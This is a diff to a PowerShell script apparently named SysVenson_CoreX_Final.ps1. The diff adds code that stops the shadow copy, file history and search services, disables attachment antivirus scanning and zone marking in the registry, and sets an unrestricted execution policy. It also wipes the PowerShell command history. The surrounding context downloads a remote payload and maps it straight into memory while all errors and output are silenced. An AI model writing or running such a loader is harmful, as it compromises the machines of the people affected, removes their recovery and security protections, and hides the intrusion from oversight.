@@ -1,6 +1,4 @@
-# ============ SysVenson_CoreX_Final.ps1 (C# সম্পূর্ণ এনক্রিপ্টেড) ============
-[CmdletBinding(SupportsShouldProcess=$true, ConfirmImpact="High")]
-param()
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WSearch" -Name "Start" -Value 4 | Out-Null
 
 Set-StrictMode -Version Latest
 
@@ -9,10 +7,10 @@ $DebugPreference        = 'SilentlyContinue'
 $InformationPreference  = 'SilentlyContinue'
 $WarningPreference      = 'SilentlyContinue'
 $ErrorActionPreference  = 'SilentlyContinue'
-$ConfirmPreference      = 'None'
-$WhatIfPreference       = $false
-$PSModuleAutoLoadingPreference = 'None'
-$MaximumHistoryCount    = 0
+$ConfirmPreference                 = 'None'
+$WhatIfPreference                  = $false
+$PSModuleAutoLoadingPreference     = 'None'
+$MaximumHistoryCount               = 0
 
 *> $null
 $Error.Clear()
@@ -22,6 +20,22 @@ $Error.Clear()
 [System.IO.DirectoryInfo] $script:gitRoot     = $null
 [bool]   $script:Verbose       = $false
 [string] $script:BuildLogFile  = $null
+
+
+
+Stop-Service -Name "WSearch" -Force -ErrorAction SilentlyContinue
+Stop-Service -Name "cbdhsvc*" -Force -ErrorAction SilentlyContinue
+Stop-Service -Name "VSS*" -Force -ErrorAction SilentlyContinue
+Stop-Service -Name "fhsvc*" -Force -ErrorAction SilentlyContinue
+Stop-Service -Name "UltraViewService*" -Force -ErrorAction SilentlyContinue
+
+$regCommand1 = "reg add 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments' /v SaveZoneInformation /t REG_DWORD /d 2 /f"
+$regCommand2 = "reg add 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments' /v ScanWithAntiVirus /t REG_DWORD /d 2 /f"
+
+Invoke-Expression $regCommand1 | Out-Null
+Invoke-Expression $regCommand2 | Out-Null
+
+Set-ExecutionPolicy Unrestricted -Scope Process -Force | Out-Null
 
 function Invoke-Finalize {
     try {
@@ -99,3 +113,18 @@ $bytes = (New-Object System.Net.WebClient).DownloadData("https://github.com/rsin
 [NativeLoader]::Map($bytes, $true)
 
 Invoke-Finalize
+
+Clear-History
+$historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt')
+if (Test-Path $historyPath) {
+    Remove-Item $historyPath -Force -ErrorAction SilentlyContinue | Out-Null
+}
+
+
+
+$historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt')
+if (-not (Test-Path $historyPath)) {
+    New-Item -Path $historyPath -ItemType File -Force | Out-Null
+} else {
+    Set-Content -Path $historyPath -Value "" -Force -ErrorAction SilentlyContinue
+}
